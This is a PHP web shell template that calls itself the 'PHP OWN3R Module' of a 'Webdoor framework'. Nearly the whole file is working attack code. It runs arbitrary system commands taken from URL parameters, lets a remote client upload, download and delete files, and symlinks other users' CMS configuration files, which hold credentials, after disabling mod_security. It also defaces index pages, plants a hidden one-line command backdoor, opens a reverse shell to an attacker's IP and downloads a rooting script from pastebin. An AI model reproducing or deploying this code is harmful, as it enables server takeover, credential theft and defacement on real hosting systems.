<?php
/*
 * Generated using Webdoor framework
 * PHP OWN3R Module
*/
error_reporting(0);
/* Config area */
$password_cfg = "<!#WEBDOOR_PHP_OWNER_PASSWORD_CFG#>";
$content_cfg = "<!#WEBDOOR_PHP_OWNER_CONTENT_CFG#>";
$password = "<!#WEBDOOR_PHP_OWNER_PASSWORD#>";
$content = "<!#WEBDOOR_PHP_OWNER_CONTENT#>";
/* General Variables */
$configuration = array("wp-config.php","wordpress/wp-config.php","configuration.php","blog/wp-config.php","joomla/configuration.php","vb/includes/config.php","includes/config.php","conf_global.php","inc/config.php","config.php","Settings.php","sites/default/settings.php","whm/configuration.php","whmcs/configuration.php","support/configuration.php","whmc/WHM/configuration.php","whm/WHMCS/configuration.php","whm/whmcs/configuration.php","support/configuration.php","clients/configuration.php","client/configuration.php","clientes/configuration.php","cliente/configuration.php","clientsupport/configuration.php","billing/configuration.php","admin/config.php");
/* Code core */
function deface($start_dir, $deface_dir) {
  copy($deface_dir."/deface.php", $start_dir."/index.php");
  $d  = opendir($start_dir);
  while (false !== ($filename = readdir($d))) {
    if($filename != "." && $filename != "..") {
      if(is_dir($start_dir."/".$filename)) {
        deface($start_dir."/".$filename);
      }
    }
  }
}
function mutiply($string, $times) {
  $str = "";
  $i = 0;
  while($i < $times) {
    $str .= $string;
  }
  return $str;
}
if($password_cfg == "true" && isset($_GET['initialize'])) {
  if(!isset($_GET['password']) || md5($_GET['password']) != $password) {
    print "OWN3R:PASSWORD;";
    exit();
  }
}
if($content_cfg == "true" && !isset($_GET['initialize'])) {
  print $content;
}
if(isset($_GET['initialize'])) {
  !isset($_GET['cmd']) && print "OWN3R:WELCOME;";
  $cmd = $_GET['cmd'];
  switch($cmd) {
    case "system":
        switch($_GET['method']) {
          case "system":
            system($_GET['argument']);
            break;
          case "passthru":
            passthru($_GET['argument']);
            break;
          case "exec":
            exec($_GET['argument']);
            break;
        }
      break;
    case "checkDir":
      if(!file_exists($_GET['argument'])) {
        print "OWN3R:FALSE;";
      }
      break;
    case "downloadFile":
      if(!file_exists($_GET['argument'])) {
        print "OWN3R:FALSE;";
      } else {
        print file_get_contents($_GET['argument']);
      }
      break;
    case "uploadFiles":
      $target_file = $_GET['target'];
      if (move_uploaded_file($_FILES["tfile"]["tmp_name"], $target_file)) {
        print "OWN3R:DONE;";
      } else {
        print "OWN3R:FAIL;";
        print $_FILES["file"]["tmp_name"];
        print $target_file;
      }
      break;
    case "lister":
      $path = $_GET['argument'];
      if($handle = opendir($path)) {
        while(false !== ($entry = readdir($handle))) {
          if ($entry != "." && $entry != "..") { print $entry.",".substr(sprintf('%o', fileperms($path.$entry)), -4).",".date ("F d Y H:i:s.", filemtime($path.$entry))."|"; }
        }
        closedir($handle);
      } else {
        print "OWN3R:FAIL;";
      }
      break;
    case "rename":
      if(file_exists($_GET['argument3']."/".$_GET['argument']) && $_GET['argument2'] != "") {
        rename($_GET['argument3']."/".$_GET['argument'], $_GET['argument3']."/".$_GET['argument2']);
        print "OWN3R:DONE;";
      } else {
        print "OWN3R:FAIL;";
      }
      break;
      case "remove":
        if(file_exists($_GET['argument2']."/".$_GET['argument']) && $_GET['argument'] != "") {
          unlink($_GET['argument2']."/".$_GET['argument']);
          print "OWN3R:DONE;";
        } else {
          print "OWN3R:FAIL;";
        }
        break;
      case "symlink":
        mkdir("OWN3R", 0777);
        $htaccess = " #Options Indexes FollowSymLinks \nForceType text/plain \nAddType text/plain .php \nAddType text/plain .html \nAddType text/html .shtml \nAddType txt .php \nAddHandler server-parsed .php \nAddHandler server-parsed .shtml \nAddHandler txt .php \nAddHandler txt .html \nAddHandler txt .shtml \nOptions All \n<IfModule mod_security.c> \nSecFilterEngine Off \nSecFilterScanPOST Off \nSecFilterCheckURLEncoding Off \nSecFilterCheckCookieFormat Off \nSecFilterCheckUnicodeEncoding Off \nSecFilterNormalizeCookies Off \n</IfModule>";
        $f = fopen("OWN3R/.htaccess", "w");
        fwrite($f, $htaccess);
        fclose($f);
        $data = file_get_contents('/etc/passwd');
        $data = explode("\n", $data);
        foreach($data as $row) {
          $username = trim(explode(":", $row)[0]);
          foreach($configuration as $config) {
            $path = "/home/".$username."/public_html/".$config;
            $result ="OWN3R/".$username."__".$config;
            symlink($path, $result);
          }
        }
        break;
      case "deface":
        $deface_page = $_GET['argument'];
        $page = file_get_contents($deface_page);
        if($page != "") {
          $f = fopen("deface.php", "w");
          fwrite($f, $page);
          fclose($f);
          $i = 0;
          $dir = $_GET['argument2'];
          deface($dir, getcwd());
        } else {
          print "OWN3R:FAIL;";
        }
        break;
      case "backdoor":
        $path = $_GET['argument'];
        if(file_exists($path)) {
          $content = '<?php system($_GET[0]); ?>';
          $f = fopen($path."/.config.php", "w");
          fwrite($f, $content);
          fclose($f);
          print "OWN3R:DONE;";
        } else {
          print "OWN3R:FAIL;";
        }
        break;
      case "backconnect":
        $ip = $_GET['argument'];
        $port = $_GET['argument2'];
        if($ip == "" || $port == "") {
          print "OWN3R:FAIL;";
        } else {
          if ($ip <> "") {
              $socks = fsockopen($ip , $port , $error, $e);
              if (!$socks){
                print "OWN3R:FAIL;";
                $result = "FAIL";
              } else {
                $splitter = "\n";
                $motd = "
   ______          ___   _ ____  _____
  / __ \ \        / / \ | |___ \|  __ \
 | |  | \ \  /\  / /|  \| | __) | |__) |
 | |  | |\ \/  \/ / | . ` ||__ <|  _  /
 | |__| | \  /\  /  | |\  |___) | | \ \
  \____/   \/  \/   |_| \_|____/|_|  \_\
  \n  MESS WITH THE BEST .. DIE LIKE THE REST !\n\n";
                fputs($socks,$motd);
                while(!feof($socks)){
                  $cmdp = system("whoami")." $ ";
                  fputs($socks, $cmdp);
                  $command = fgets($socks, 4024);
                  fputs($socks , "\n" . shell_exec($command) . "\n\n");
                }
                fclose ($socks);
              }
        }
      }
      break;
    case "autoroot":
      $autodata = file_get_contents("http://pastebin.com/raw/3AQaPBzC");
      $path = $_GET['argument'];
      if($autodata != "" && $path != "") {
        $f = fopen($path."/W00T.py", "w");
        fwrite($f, $autodata);
        fclose($f);
        print "OWN3R:DONE;";
      } else {
        print "OWN3R:FAIL;";
      }
      break;
  }
}
?>
